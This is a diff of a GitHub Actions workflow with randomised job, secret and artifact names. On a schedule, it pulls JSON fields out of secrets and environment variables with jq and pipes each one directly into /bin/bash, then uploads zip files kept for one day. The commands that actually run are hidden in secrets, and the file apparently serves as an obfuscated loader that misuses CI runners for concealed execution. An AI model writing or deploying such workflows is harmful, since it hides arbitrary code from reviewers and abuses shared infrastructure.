@@ -1,9 +1,9 @@
 name: gregorysolid222
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '22 5/6 * * *'
+    - cron: '31 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,20 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: gregorysolid222
         env:
-          hfm02027: ${{ secrets.hfm02027 }}
+          eo0538: ${{ secrets.eo0538 }}
         run: |
-          echo $hfm02027 | jq -r .pp7 | /bin/bash
-          echo $b2110 | jq -r .fsakm99867 | /bin/bash
-          echo $nim60 | jq -r .l00876 | /bin/bash
-          echo $bzrg32 | jq -r .fm3193 | /bin/bash
-          echo $ofcs1547 | jq -r .hv4 | /bin/bash
-          echo $dvrp377 | jq -r .cxbj16 | /bin/bash
-          echo $lb3 | jq -r .oto7989 | /bin/bash
-          echo $aw7 | jq -r .ceo018 | /bin/bash
-          echo $qrrde0001 | jq -r .ezp69896 | /bin/bash
-          echo $sq9556 | jq -r .h51 | /bin/bash
-          echo $gyu426 | jq -r .ynl43061 | /bin/bash
-          echo $dij90411 | jq -r .xowxx881 | /bin/bash
-          echo $t96481 | jq -r .ara912 | /bin/bash
-          echo $ovg86113 | jq -r .jk64 | /bin/bash
+          printf '%s' "$eo0538" | jq -r .xna1 | /bin/bash
+          echo $xh2987 | jq -r .b138 | /bin/bash
+          echo $oz9715 | jq -r .bu36 | /bin/bash
+          echo $aun7312 | jq -r .z4 | /bin/bash
+          echo $i42 | jq -r .ew524 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: lPyuclD2
+          path: "*.zip"
+          retention-days: 1
